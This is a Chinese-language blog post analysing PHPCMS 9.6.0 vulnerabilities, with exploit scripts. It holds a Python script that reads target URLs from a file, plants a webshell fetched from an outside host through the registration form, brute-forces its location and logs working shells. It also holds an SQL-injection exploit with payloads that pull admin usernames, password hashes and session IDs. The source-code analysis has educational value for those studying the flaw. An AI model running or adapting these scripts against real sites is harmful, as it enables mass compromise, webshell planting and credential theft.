### 前言
粗浅的分析下phpcms的几个版本的漏洞，附上exp。

### phpcms9.6.0

#### upload

漏洞分析就看这个吧，大佬分析的真的是全面。

[https://www.hackersb.cn/hacker/219.html](https://www.hackersb.cn/hacker/219.html)

这个漏洞产生原因主要是对download函数的过滤不严，在对远程连接地址的过滤可绕过，在9.6.1中已经修复。

##### EXP_upload
网上公布的大部分脚本都是根据页面回显提取shell地址，但是我本地测试的时候并没有爆mysql的错误把地址回显出来，所以只能尝试爆破。
	#!/usr/bin/env python
	# coding: utf-8
	#Authon:phyb0x
	#phpcms9.6.0 upload

	import requests
	import time 
	import re

	result = []
	def savewebshell(file,list):
		s = '\n'.join(list)
		with open(file,'a') as output:
			output.write(s)

	def poc():
		fp = open("url.txt","r")
		alllines = fp.readlines()
		fp.close()
		for eachline in alllines:
			eachline = eachline.strip()
			host = eachline
			try:
				url ="{}index.php?m=member&c=index&a=register&siteid=1".format(host)
				shell = ''
				data = {
					'siteid':'1',
					'modelid':'11',
					'username':'t3esht123',
					'password':'t3esht123',
					'email':'tdehst@qq.com',
					'info[content]':'<img src=http://www.blogsir.com.cn/lj_ctf/shell.txt?.php#.jpg>',
					'dosubmit':'1'}
	
				nowtime = time.strftime('%Y%m%d%I%M%S')
				nowtime = nowtime[:13]
				req = requests.post(url=url,data=data)
				path = 'uploadfile/' + time.strftime("%Y") +'/'+ time.strftime("%m%d") + '/'
				for i in range(0000,9999):
					filename = nowtime + str(i) +'.php'
					shell = host + path + filename
					req = requests.get(url=shell)
					if req.status_code == 200:
						global result
						result.append(shell)
						print('shell:',shell)
						break
					else:
						print('NO BUG')
						break
			except Exception as a:
				print('Request Bad')			

	if __name__ == '__main__':
		poc()
		savewebshell('webshell.txt',result)
可以结合我github上的zoomeye_api配合使用，不过好像不太好用.....


#### sqli

漏洞的出发点在phpcms\modules\content\down.php

	public function init() {
		$a_k = trim($_GET['a_k']); //get获取变量
		if(!isset($a_k)) showmessage(L('illegal_parameters'));
		$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));//对参数进行解密
		if(empty($a_k)) showmessage(L('illegal_parameters'));
		unset($i,$m,$f);
		parse_str($a_k);//将字符串解析到变量
		if(isset($i)) $i = $id = intval($i);
		if(!isset($m)) showmessage(L('illegal_parameters'));
		if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters'));
		if(empty($f)) showmessage(L('url_invalid'));
		$allow_visitor = 1;
		$MODEL = getcache('model','commons');
		$tablename = $this->db->table_name = $this->db->db_tablepre.$MODEL[$modelid]['tablename'];
		$this->db->table_name = $tablename.'_data';
  	***	$rs = $this->db->get_one(array('id'=>$id));	//进行sql查询
		$siteids = getcache('category_content','commons');
		$siteid = $siteids[$catid];
		$CATEGORYS = getcache('category_content_'.$siteid,'commons');

		$this->category = $CATEGORYS[$catid];
		$this->category_setting = string2array($this->category['setting']);
		——————省略——————
整个流程就是先获取参数然后调用sys_auth进行'DECODE'解密，parse_str()解析变量最后也是最重要的get_one把id参数代入sql。

这里漏洞产生还有一个原因，看大佬分析这里parse_str()会解析url编码，所以代入sql的payload才会被执行。不过我觉得这里只能算是php的一个特性吧，算是函数使用不当，毕竟没有进行任何操作解密后就直接把参数代入查询怎么看也是最大的锅！

phpcms\libs\classes\acccess.class.php 第50行


	function get_one($query) {
		$this->querynum++;
	    $rs = $this->conn->Execute($query);
 		$r = $this->fetch_array($rs);
		$this->free_result($rs);
		return $r;
	}
到现在很明确，我们要把payload加密整合到$a_k中的id参数才能利用。
而且秘钥我们并没有,要利用目标phpcms站点进行在线加密把加密后的payload回显出来，还有几个前置条件:

    $i为空
    $m不为空
    $modelid 且 $catid 不为空
    $f不为空


phpcms\modules\attachment\attachments.php 第239行

		public function swfupload_json() {
		$arr['aid'] = intval($_GET['aid']);
		$arr['src'] = safe_replace(trim($_GET['src']));
		$arr['filename'] = urlencode(safe_replace($_GET['filename']));
		$json_str = json_encode($arr);
		$att_arr_exist = param::get_cookie('att_json');
		$att_arr_exist_tmp = explode('||', $att_arr_exist);
		if(is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
			return true;
		} else {
			$json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str;
			param::set_cookie('att_json',$json_str);
			return true;			
		}
	}
这里主要涉及三个函数，safe_replace、get_cookie、set_cookie

phpcms\libs\param.class.php 86行

	public static function set_cookie($var, $value = '', $time = 0) {
		$time = $time > 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0);
		$s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0;
		$var = pc_base::load_config('system','cookie_pre').$var;
		$_COOKIE[$var] = $value;
		if (is_array($value)) {
			foreach($value as $k=>$v) {
				setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);
			}
		} else {
			setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);
		}
	}
这里可以看到set_cookie调用了sys_auth加密函数，同理get_cookie调用解密。在函数中我们可以看到att_json作为键值 json_str(aid、src、filename)作为值传入cookie中加密，而且src参数只进行safe_replace，也就是说我们可以把payload传入src参数到set_cookie中去加密。

	function safe_replace($string) {
    $string = str_replace('%20','',$string);
    $string = str_replace('%27','',$string);
    $string = str_replace('%2527','',$string);
    $string = str_replace('*','',$string);
    $string = str_replace('"','"',$string);
    $string = str_replace("'",'',$string);
    $string = str_replace('"','',$string);
    $string = str_replace(';','',$string);
    $string = str_replace('<','<',$string);
    $string = str_replace('>','>',$string);
    $string = str_replace("{",'',$string);
    $string = str_replace('}','',$string);
    $string = str_replace('\\','',$string);
    return $string;
	}

不多说很好进行绕过了吧。不过如果我们直接访问访问不到swfupload_json()，这里有一个构造函数如果cookie的_userid或者表单userid_flash的值为空会跳转到主页。所以我们要先获取cookie

        
        $this->db = pc_base::load_model('content_model');
        $this->siteid = isset($_GET['siteid']) && (intval($_GET['siteid']) > 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
        param::set_cookie('siteid',$this->siteid);    
        $this->wap_site = getcache('wap_site','wap');
        $this->types = getcache('wap_type','wap');
        $this->wap = $this->wap_site[$this->siteid];
        define('WAP_SITEURL', $this->wap['domain'] ? $this->wap['domain'].'index.php?' : APP_PATH.'index.php?m=wap&siteid='.$this->siteid);
        if($this->wap['status']!=1) exit(L('wap_close_status'));
可以看到set_cookie函数把value代入cookie满足条件。

##### 漏洞利用

第一步：访问index.php?m=wap 获取userid_flash的值(wap模块开不开启都能获取)

![](https://i.imgur.com/Syrn7AV.png)

第二步:

![](https://i.imgur.com/WePRdNn.png)

可以看到利用swfupload_json把src=%26id%3d%2*7and%20updatexml(1,concat(1,(user())),1)%23%26m%3d1%26modelid%3d1%26catid%3d1%26f%3d1 进行加密处理并回显出来。

第三步:

![](https://i.imgur.com/U8c7xoO.png)

用GET方法提交赋予加密payload的$a_k，注入成功。

##### EXP

	import requests
	import urllib
	import re

	def poc(url):
		step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
		req = requests.get(url=step1)
		for i in req.cookies:
			if i.name[-7:] == '_siteid':
				userid_flash = i.value
			else:
				print('Step1 is error')

		#payload ='&id=%*27 and updatexml(1,concat(1,(select concat(username,0x3a,encrypt) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f='
		#payload="&id=%*27 and updatexml(1,concat(1,(select concat(0x3a,password,0x3a) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
		#payload="&id=%*27 and updatexml(1,concat(1,(select concat(0x706f6374657374,username,0x23,password,0x3a,encrypt,0x706f6374657374) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
		#payload ='&id=%*27 and updatexml(1,concat(1,(select concat(sessionid) from v9_session)),1)%23&modelid=1&catid=1&m=1&f='
	
		payload =urllib.parse.quote(payload)
		step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}".format(url,payload)
		data = {'userid_flash':userid_flash}
		req2 = requests.post(url=step2,data=data)
		for i in req2.cookies:
			if i.name[-9:] == '_att_json':
				a_k = i.value
		if a_k == '':
			print('sys_paylaod Bad')

		step3 = "{}/index.php?m=content&c=down&a_k={}".format(url,a_k)
		req3 = requests.get(url=step3)
		if 'MySQL Error' in req3.text:
			result = re.findall(r"MySQL Error : </b>XPATH syntax error: '(.*?)' <br /> <b>MySQL Errno",req3.text)
			print(result)

	if __name__ == '__main__':
		poc('http://localhost/phpcms9.6.0/')

这个出的密码加盐的，要解密，据说可以直接获取session但是我简单试 一下没成。




参考链接：

https://xz.aliyun.com/t/201

https://www.waitalone.cn/phpcmsv96-sql-getshell.html

https://www.kingkk.com/2018/07/phpcms-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1

